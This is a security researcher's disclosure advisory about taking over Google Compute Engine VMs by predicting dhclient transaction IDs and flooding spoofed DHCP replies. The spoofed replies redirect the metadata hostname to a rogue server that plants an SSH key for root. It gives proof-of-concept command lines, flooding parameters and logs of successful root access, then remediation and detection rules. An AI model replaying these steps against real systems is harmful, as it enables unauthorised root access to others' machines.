# Abstract

This is an advisory about an unpatched vulnerability (at time of publishing this repo, 2021-06-25) affecting 
virtual machines in Google's Compute Engine platform. 
The technical details below is almost exactly the same as my report sent to the VRP team.

Attackers could take over virtual machines of the Google Cloud Platform over the network due to weak 
random numbers used by the ISC DHCP software and an unfortunate combination of additional factors.
This is done by impersonating the Metadata server from the targeted virtual machine's point of view.
By mounting this exploit, the attacker can grant access to themselves over SSH (public key authentication) 
so then they can login as the root user.


# The vulnerability

ISC's implementation of the DHCP client (isc-dhcp-client package on the Debian flavors) relies on
random(3) to generate pseudo-random numbers (a nonlinear additive feedback random). 
It is [seeded](https://github.com/isc-projects/dhcp/blob/master/client/dhclient.c) with the srandom function as follows:

```
	/* Make up a seed for the random number generator from current
	   time plus the sum of the last four bytes of each
	   interface's hardware address interpreted as an integer.
	   Not much entropy, but we're booting, so we're not likely to
	   find anything better. */
	seed = 0;
	for (ip = interfaces; ip; ip = ip->next) {
		int junk;
		memcpy(&junk,
		       &ip->hw_address.hbuf[ip->hw_address.hlen -
					    sizeof seed], sizeof seed);
		seed += junk;
	}
	srandom(seed + cur_time + (unsigned)getpid());
```

This effectively consists of 3 components:

- the current unixtime when the process is started

- the pid of the dhclient process

- the sum of the last 4 bytes of the ethernet addresses (MAC) of the network interface cards

On the Google Cloud Platform, the virtual machines usually have only 1 NIC, something like this:

```
root@test-instance-1:~/isc-dhcp-client/real3# ifconfig
ens4: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1460
        inet 10.128.0.2  netmask 255.255.255.255  broadcast 10.128.0.2
        inet6 fe80::4001:aff:fe80:2  prefixlen 64  scopeid 0x20<link>
        ether 42:01:0a:80:00:02  txqueuelen 1000  (Ethernet)
        RX packets 1336873  bytes 128485980 (122.5 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 5708403  bytes 2012678044 (1.8 GiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Note that the last 4 bytes (`0a:80:00:02`) of the MAC address (`42:01:0a:80:00:02`) are actually the same as 
the internal IP address of the box (`10.128.0.2`). This means, 1 of the 3 components is effectively public.

The pid of the dhclient process is predictable. The linux kernel assigns process IDs in a linear way.
I found that the pid varies between 290 and 315 (by rebooting a Debian 10 based VM many times and 
checking the pid), making this component of the seed easily predictable.

The unix time component has a more broad domain, but this turns out to be not a practical problem (see later).

The firewall/router of GCP blocks broadcast packets sent by VMs, so only the metadata server (169.254.169.254)
receives them. However, some phases of the DHCP protocol don't rely on broadcasts, and the packets to be sent
can be easily calculated and sent in advance.

To mount this attack, the attacker needs to craft multiple DHCP packets using a set of precalculated/suspected 
XIDs and flood the victim's dhclient directly (no broadcasts here). If the XID is correct, the victim machine applies 
the network configuration. This is a race condition, but since the flood is fast and exhaustive, the metadata server 
has no real chance to win.

At this point the attacker is in the position of reconfiguring the network stack of the victim.

Google heavily relies on the Metadata server, including the distribution of ssh public keys. 
The connection is secured at the network/routing layer and the server is not authenticated (no TLS, clear 
http only). The `google_guest_agent` process, that is responsible for processing the responses of the
Metadata server, establishes the connection via the virtual hostname `metadata.google.internal` which
is an alias in the `/etc/hosts` file. This file is managed by `/etc/dhcp/dhclient-exit-hooks.d/google_set_hostname`
as a hook part of the DHCP response processing and the alias is normally added by this script at each 
DHCPACK.
By having full control over DHCP, the Metadata server can be impersonated. This attack has been found and 
documented by `Chris Moberly`, who inspired my research with his oslogin privesc write up here:

https://gitlab.com/gitlab-com/gl-security/security-operations/gl-redteam/red-team-tech-notes/-/tree/master/oslogin-privesc-june-2020

The difference is, flooding of the dhclient process is done remotely in my attack and the XIDs are guessed.

The attack consists of 2 phases:

#1 Instructing the client to set the IP address of the rogue metadata server on the NIC.
No router is configured. This effectively cuts the internet connection of the box. 
`google_guest_agent` can't fall back to connecting the real metadata server.
This DHCP lease is short lived (15 seconds), so dhclient sends a DHCPREQUEST soon again and starts looking 
for a new DHCPACK. 

Since a new ip address (the rouge metadata server) and new hostname (`metadata.google.com`) is part of this
DHCPACK packet, the `google_set_hostname` function adds two lines like like below (35.209.180.239 is the rouge 
metadata server I used):

35.209.180.239 metadata.google.internal metadata  # Added by Google
169.254.169.254 metadata.google.internal  # Added by Google


The attacker is still flooding at this point, and since ARP is not flushed quickly, these packets are 
still delivered.

#2. Restoring a working network stack, along with the valid router address. This DHCPACK does not contain a hostname,
so `google_set_hostname` won't touch `/etc/hosts`. The poisoned `metadata.google.internal` entry remains in there.

In case multiple entries are present in the hosts file, the Linux kernel prioritizes the link-local address 
(169.254.169.254) lower than the routable ones.

At this point `google_guest_agent` can establish a TCP connection to the (rouge) metadata server, where it gets
a config that contains the attacker's ssh public key. The entry is populated into `/root/.ssh/authorized_keys`
and the attacker can open a root shell remotely.


# Attack scenarios

Attackers would gain full access to the targeted virtual machines in all attack scenarios below.

- Attack #1: Targeting a VM on the same subnet (~same project), while it is rebooting.
  The attacker needs presence on another host.

- Attack #2: Targeting a VM on the same subnet (~same project), while it is refreshing the lease (so no reboot is needed).
  This takes place every half an hour (1800s), making 48 windows/attempts possible a day. 
  Since an F class VM has ~170.000 pps (packet per second), and a day of unixtime + potential pids makes ~86420 potential 
  XIDs, this is a feasible attack vector.
  
- Attack #3: Targeting a VM over the internet. This requires the firewall in front of the victim VM to be fully open. 
  Probably not a common scenario, but since even the webui of GCP Cloud Console has an option for that, there must be 
  quite some VMs with this configuration. 
  In this case the attacker also needs to guess the internal IP address of the VM, but since the first VM seems 
  to get `10.128.0.2` always, the attack could work, still.



# Proof of concepts

## Attack #1

As described above, you need to run a rogue metadata server running a host with port 80 open from the internet. 
I used 35.209.180.239 for this purpose (this is the public IP address of 10.128.0.2, a compute engine box actually), 
meta.py is running here:

```
	root@test-instance-1:~/isc-dhcp-client/real3# ./meta.py
	Usage: ./meta.py id_rsa.pub

	root@test-instance-1:~/isc-dhcp-client/real3# ./meta.py id_rsa.pub
```

My proof of concept exploits a simplified setup, when the victim box is being rebooted. In this case unixtime
of the dhclient process can be guessed easily.

```
	root@test-instance-1:~/isc-dhcp-client/real3# ./takeover-at-reboot.pl
	Usage: ./takeover-at-reboot.pl victim-ip-address meta-ip-address
```

The victim box is `10.128.0.4` here. The public IP address of this host is `34.67.219.89`.
Verifying first we don't have access using the RSA private key that belongs to id_rsa.pub referenced above 
for meta.py:

```
	root@builder:/opt/_tmp/dhcp/exploit# ssh -i id_rsa root@34.67.219.89
	Permission denied (publickey).
```

Then the attack is started:

```
	root@test-instance-1:~/isc-dhcp-client/real3# ./takeover-at-reboot.pl 10.128.0.4 35.209.180.239

	10.128.0.4: alive: 1601231808...
```

Then I type reboot on the victim host (`10.128.0.4`). The rest of the output of `takeover-at-reboot.pl`:
	
```
	10.128.0.4 seems to be not alive anymore
	RUN: ip addr show dev ens4 | awk '/inet / {print $2}' | cut -d/ -f1
	RUN: ip route show default | awk '/via/ {print $3}'
	NIC: ens4
	Min pid: 290
	Max pid: 315
	Min ts: 1601231808
	Max ts: 1601231823
	My IP: 10.128.0.2
	Router: 10.128.0.1
	Target IP: 10.128.0.4
	Target MAC: 42:01:0a:80:00:04
	Number of potential xids: 41
	Initial OFFER+ACK flood
	MAC: 42:01:0a:80:00:04
	Src IP: 10.128.0.2
	Dst IP: 10.128.0.4
	New IP: 35.209.180.239
	New hostname: metadata.google.internal
	New route:
	ACK: true
	Offer: true
	Oneshot: false
	Flooding again to revert the original network config
	MAC: 42:01:0a:80:00:04
	Src IP: 10.128.0.2
	Dst IP: 10.128.0.4
	New IP: 10.128.0.4
	New hostname:
	New route: 10.128.0.1
	ACK: true
	Offer: false
	Oneshot: false
```

After this point, the output of the screen where meta.py is running is flooded with lines like this:

```
	34.67.219.89 - - [27/Sep/2020 18:40:06] "GET /computeMetadata/v1//?recursive=true&alt=json&wait_for_change=true&timeout_sec=60&last_etag=NONE HTTP/1.1" 200 -
```

At this point, I can login to victim box using the new (attacker controlled) SSH key.

```
	root@builder:/opt/_tmp/dhcp/exploit# ssh -i id_rsa root@34.67.219.89
	Linux metadata 4.19.0-11-cloud-amd64 #1 SMP Debian 4.19.146-1 (2020-09-17) x86_64

	The programs included with the Debian GNU/Linux system are free software;
	the exact distribution terms for each program are described in the
	individual files in /usr/share/doc/*/copyright.

	Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
	permitted by applicable law.
	root@metadata:~# id
	uid=0(root) gid=0(root) groups=0(root),1000(google-sudoers)
```

This was tested using the official Debian 10 images.




## Attack #2

To verify this setup, I built a slightly modified version of dhclient; besides some additional log lines the only important change is the 
increased frequency of lease renewals:

```
*** dhclient.c.orig     2020-09-29 23:38:16.322296529 +0200
--- dhclient.c  2020-09-29 22:51:11.000000000 +0200
*************** void bind_lease (client)
*** 1573,1578 ****
--- 1573,1580 ----
          client->new = NULL;

          /* Set up a timeout to start the renewal process. */
+         client->active->renewal = cur_time + 5; // hack!
+
          tv.tv_sec = client->active->renewal;
          tv.tv_usec = ((client->active->renewal - cur_tv.tv_sec) > 1) ?
                          myrandom("active renewal") % 1000000 : cur_tv.tv_usec;
```


A 10 minute window consists of ~600 potetial XIDs. I rebooted the victim host (`10.128.0.4`), logged in, ran
`journalctl -f|grep dhclient` to see what is going on. Then I executed the `takeover-at-renew.pl` script 
on the attacker machine (internal ip: `10.128.0.2`, external ip: `35.209.180.239`, a VM on the same subnet):

```
# ONESHOT_WINDOW_MIN=10 ./takeover-at-renew.pl 10.128.0.4 35.209.180.239
```

This resulted the following log lines on the victim machine:

```
Oct 02 07:06:05 test-instance-2 dhclient[301]: DHCPREQUEST for 10.128.0.4 on ens4 to 169.254.169.254 port 67
Oct 02 07:06:05 test-instance-2 dhclient[301]: DHCPACK of 10.128.0.4 from 169.254.169.254
Oct 02 07:06:05 test-instance-2 dhclient[301]: bound to 10.128.0.4 -- renewal in 5 seconds.
Oct 02 07:06:10 test-instance-2 dhclient[301]: DHCPREQUEST for 10.128.0.4 on ens4 to 169.254.169.254 port 67
Oct 02 07:06:10 test-instance-2 dhclient[301]: DHCPACK of 10.128.0.4 from 169.254.169.254
Oct 02 07:06:11 test-instance-2 dhclient[301]: bound to 10.128.0.4 -- renewal in 5 seconds.
Oct 02 07:06:16 test-instance-2 dhclient[301]: DHCPREQUEST for 10.128.0.4 on ens4 to 169.254.169.254 port 67
Oct 02 07:06:16 test-instance-2 dhclient[301]: DHCPACK of 10.128.0.4 from 169.254.169.254
Oct 02 07:06:16 test-instance-2 dhclient[301]: bound to 10.128.0.4 -- renewal in 5 seconds.
Oct 02 07:06:21 test-instance-2 dhclient[301]: DHCPREQUEST for 10.128.0.4 on ens4 to 169.254.169.254 port 67
Oct 02 07:06:21 test-instance-2 dhclient[301]: DHCPACK of 10.128.0.4 from 169.254.169.254
Oct 02 07:06:21 test-instance-2 dhclient[301]: bound to 10.128.0.4 -- renewal in 5 seconds.
Oct 02 07:06:26 test-instance-2 dhclient[301]: DHCPREQUEST for 10.128.0.4 on ens4 to 169.254.169.254 port 67
Oct 02 07:06:26 test-instance-2 dhclient[301]: DHCPACK of 10.128.0.4 from 169.254.169.254
Oct 02 07:06:26 test-instance-2 dhclient[301]: bound to 10.128.0.4 -- renewal in 5 seconds.
Oct 02 07:06:31 test-instance-2 dhclient[301]: DHCPREQUEST for 10.128.0.4 on ens4 to 169.254.169.254 port 67
Oct 02 07:06:31 test-instance-2 dhclient[301]: DHCPACK of 35.209.180.239 from 10.128.0.2
Oct 02 07:06:32 metadata dhclient[301]: bound to 35.209.180.239 -- renewal in 5 seconds.
Oct 02 07:06:37 metadata dhclient[301]: DHCPREQUEST for 35.209.180.239 on ens4 to 35.209.180.239 port 67
Oct 02 07:06:44 metadata dhclient[301]: DHCPREQUEST for 35.209.180.239 on ens4 to 35.209.180.239 port 67
Oct 02 07:06:46 metadata dhclient[301]: DHCPACK of 10.128.0.4 from 10.128.0.2
Oct 02 07:06:47 metadata dhclient[301]: bound to 10.128.0.4 -- renewal in 5 seconds.
```

This means the 6th round was successful. With "normal" lease renewal (unpatched `dhclient`), the same thing would have 
taken ~3 hours.

The attack was indeed successful:

```
root@test-instance-2:~# cat /etc/hosts
127.0.0.1       localhost
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters

35.209.180.239 metadata.google.internal metadata  # Added by Google
169.254.169.254 metadata.google.internal  # Added by Google
```

I repeated the attack and flooded the victim with 3 hours of XIDs (~10000). The 51th DHCPREQUEST was hijacked (would 
have taken a little bit more than a complete day with "normal" lease times).
I concluded that the execution time indeed correlates with the number of XIDs. 
This of course would decrease the success rate in real life setups, but the attack is still feasible.


## Attack #3

A prerequisite of this attack is the GCP firewall to be effectively turned off.

I found that my DHCP related packets were not forwarded to the VM while the VM is rebooting (probably not after the 
lease is returned at reboot), effectively ruling out `takeover-at-discover.pl`.

I decided to carry out an attack against the lease renewal (effectively the same as #2). My expectation was that it should
still be feasible.

I tested this scenario using an AWS VM as the attacker machine and a really short time window (2 minutes).
The `meta.py` script was still running on the GCP attacker machine (external ip: 35.209.180.239).
I rebooted the victim machine (internal ip: `10.128.0.4`, external ip: `34.122.27.253`), logged in, ran `journalctl -f|grep dhclient`.

Then on the AWS attacker machine (external ip: `3.136.97.244`), I executed this command:

```
root@ip-172-31-25-197:~/real8# NIC=eth0 ONESHOT_WINDOW_MIN=2 FINAL_IP=10.128.0.4 MY_ROUTER=10.128.0.1 ./takeover-at-renew.pl 34.122.27.253  35.209.180.239
Flooding destination between with XIDs between 1601651865 and 1601651984
RUN: ip addr show dev eth0 | awk '/inet / {print $2}' | cut -d/ -f1
RUN: /root/real8/randr 10.128.0.4 290 315 1601651865 1601651984 2>/dev/null | paste -sd ',' - >/tmp/xids.txt
NIC: eth0
Min pid: 290
Max pid: 315
Min ts: 1601651865
Max ts: 1601651984
Attacker IP: 172.31.25.197
Router: 10.128.0.1
Target IP (initial phase): 34.122.27.253
Target MAC: 42:01:0a:80:00:04
Target IP (final phase): 10.128.0.4
34.122.27.253 is alive
Start flooding the victim for 1801 sec
And monitoring it in the background
Running for 1801 sec in the background: /root/real8/flood -ack -lease 15 -dev eth0 -dstip 34.122.27.253 -newhost metadata.google.internal -newip 35.209.180.239 -srcip 172.31.25.197 -mac 42:01:0a:80:00:04 -xidfile /tmp/xids.txt
MAC: 42:01:0a:80:00:04
Src IP: 172.31.25.197
Dst IP: 34.122.27.253
New IP: 35.209.180.239
New hostname: metadata.google.internal
New route:
ACK: true
Offer: false
Oneshot: false
Number of XIDs: 145
The host is down, it probably swallowed the poison ivy!
And now some flood again to revert connectivity
it seems the attack was successful
root@ip-172-31-25-197:~/real8# Running for 12 sec in the background: /root/real8/flood -ack -ack -lease 1800 -dev eth0 -dstip 34.122.27.253 -newip 10.128.0.4 -route 10.128.0.1 -srcip 172.31.25.197 -mac 42:01:0a:80:00:04 -xidfile /tmp/xids.txt
MAC: 42:01:0a:80:00:04
Src IP: 172.31.25.197
Dst IP: 34.122.27.253
New IP: 10.128.0.4
New hostname:
New route: 10.128.0.1
ACK: true
Offer: false
Oneshot: false
Number of XIDs: 145
```

This was running for a while and finally succeeded at the 21th DHCPREQUEST. With normal lease times this would have taken ~11 hours.
The metadata server was taken over successfully:

```
Oct 02 15:21:30 test-instance-2 dhclient[301]: DHCPACK of 35.209.180.239 from 3.136.97.244
Oct 02 15:21:30 metadata dhclient[301]: bound to 35.209.180.239 -- renewal in 5 seconds.
```

The host file was modified according to the expectations:

```
root@test-instance-2:~# cat /etc/hosts
127.0.0.1       localhost
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters

35.209.180.239 metadata.google.internal metadata  # Added by Google
169.254.169.254 metadata.google.internal  # Added by Google
```

And also got some connections from the osconfig agent (the kept-alive connection of the guest agent probably survived the network change)

```
34.122.27.253 - - [02/Oct/2020 15:29:09] "PUT /computeMetadata/v1/instance/guest-attributes/guestInventory/Hostname HTTP/1.1" 501 -
```

When I repeated this attack (2 minute XID window still), the 5th round was successful (2.5 hours with normal leases).


Conclusion about attack #2 and #3: not the most reliable thing on earth, but definetely possible. I think if I kept the victim host down
longer than the TCP read timeout of google_guest_agent, then the existing metadata server connection would be interrupted, then 
while reinitiating the connection after the network connectivity was restored, it would hit the fake metadata server.



# Remediation

- Get in touch with ISC. They really need to improve the srandom setup. Maybe get a new feature added that drops packets by 
  non-legitimate DHCP servers (so you could rely on this as an additional security measure).
- Even if ISC has improved their software, it won't be upgraded on most of your VMs. Analyze your firewall logs to learn 
  if you have any clients that rely on these ports for any legitimate reasons.
  Block udp/68 between VMs, so that only the metadata server could could carry out DHCP.
- Stop using the Metadata server via this virtual hostname (metadata.google.internal). At least in your official agents.
- Stop managing the virtual hostname (metadata.google.internal) via DHCP. The IP address is documented to be stable anyway.
- Secure the communication with the Metadata server by using TLS, at least in your official agents.

Note, using a random generated MAC address wouldn't prevent mounting the attack on the same subnet.

# FAQ

** - The issue seems generic. Are other cloud providers affected as well? **

- I checked only the major ones, they were not affected (at least at the time of checking) due to another factors 
  (e.g. not using DHCP by default).

** - If Google doesn't fix this, what can I do? **

- Google usually closes bug reports with status "Unfeasible" when the efforts required to fix outweigh the risk. 
  This is not the case here. I think there is some technical complexity in the background, which doesn't allow
  them deploying a network level protection measure easily.
  Until the fix arrives, consider one of the followings:
  - don't use DHCP
  - setup a host level firewall rule to ensure the DHCP communication comes from the metadata server (169.254.169.254)
  - setup a GCP/VPC/Firewall rule blocking udp/68 as is (all source, all destination) [more info](https://github.com/irsl/gcp-dhcp-takeover-code-exec/issues/4#issuecomment-872145234)

Google's official guidance to block untrusted internal traffic to exploit this flaw:

---
> To block incoming traffic over UDP port 68, adjust the following gCloud command syntax for your environment:
> 
> ```
> gcloud --project=<your-project> compute firewall-rules create block-dhcp --action=DENY --rules=udp:68 --network=<your-network> --priority=100
> ```
> 
> * The above command will create a firewall rule named `"block-dhcp"` in the specified project and VPC that will block all inbound traffic over UDP port 68 
> * Setting the priority to `100` gives the rule a high priority, but other values can be used. We recommend setting this value [as low as possible](https://cloud.google.com/vpc/docs/firewalls#priority_order_for_firewall_rules) to prevent other rules from superseding it 
> * The command will need to be executed for each VPC you wish to block DHCP on by replacing `<your-network>` with the respective VPC
> * Note that firewall rule names cannot be reused within the same project; multiple rules for different VPCs in a project will need to have different names (`block-dhcp2`, `block-dhcp-vpcname`, etc)
> * Additional information on configuring firewall rules can be in Google Cloud documentation [here](https://cloud.google.com/vpc/docs/using-firewalls).
---

** - How to detect this attack? **

DHCP renewal usually yields only a few packets every 30 minutes (per host). This attack requires sending a flood of
DHCP packets (hundreds of thousands of packets per second). Setting a rate limiter could probably detect or prevent
the attack:

```
iptables -A INPUT -p udp --dport 68 -m state --state NEW -m recent --set
iptables -A INPUT -p udp --dport 68 -m state --state NEW -m recent --update --seconds 1 --hitcount 10 -j LOG --log-prefix "DHCP attack detected "
```

** - What is the internal ID of this bug in Google's bug tracker? **

https://issuetracker.google.com/issues/169519201

** - Is this a vulnerability of ISC dhclient? **

While a PRNG with more entropy sources could have prevented this flaw being exploitable in GCP, I still think this is not 
a vulnerability of their implementation for the following two reasons:
- DHCP XIDs are public (broadcasted on the same LAN) anyway
- with regular IP/MAC setups (=where they are not predictable/static) and udp/68 exposed, not even the current "weak" PRNG 
  would be practically exploitable

Note: in the meanwhile, Google has identified an [additional attack vector](https://gitlab.isc.org/isc-projects/dhcp/-/issues/197)
gaining an MitM position for a local threat actor.


# Timeline

* 2020-09-26: Issue identified, attack #1 validated
* 2020-09-27: Reported to Google VRP
* 2020-09-29: VRP triage is complete "looking into it"
* 2020-10-02: Further details shared about attack #2 and #3
* 2020-10-07: Accepted, "Nice catch"
* 2020-12-02: Update requested about the estimated time of fix
* 2020-12-03: ... "holiday season coming up"
* 2021-06-07: Asked Google if a fix is coming in a reasonable time, as I'm planning to publish an advisory
* 2021-06-08: Standard response "we ask for a reasonable advance notice."
* 2021-06-25: Public disclosure

# Credits

[Imre Rad](https://www.linkedin.com/in/imre-rad-2358749b/)
